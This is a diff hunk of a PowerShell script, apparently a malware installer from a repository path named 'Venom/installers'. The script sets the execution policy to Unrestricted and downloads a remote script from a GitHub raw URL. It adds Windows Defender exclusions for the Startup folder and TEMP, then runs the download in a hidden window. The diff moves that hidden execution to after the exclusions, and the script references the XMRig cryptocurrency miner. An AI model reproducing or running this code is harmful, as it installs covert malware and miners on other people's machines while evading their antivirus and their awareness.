@@ -147,15 +147,14 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 # Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$tasks\AEQKCPrkuifY.ps1`"" -NoNewWindow -Wait
 
+cd $initial_dir
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/s.ps1" -UseBasicParsing -OutFile "ysAhVvSZMXDP.ps1
-
-Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$initial\ysAhVvSZMXDP.ps1`"" -NoNewWindow -Wait
 
 Add-MpPreference -ExclusionPath "C:/Users/$env:USERNAME/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 Add-MpPreference -ExclusionPath "$env:TEMP"
 
+Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File `"$initial\ysAhVvSZMXDP.ps1`"" -NoNewWindow -Wait
 
-cd "$initial_dir\xmrig-6.22.2"
 # Remove-Item -Path "initial_dir\xmrig-6.22.2\config.json"
 
 Start-Sleep -Seconds 340
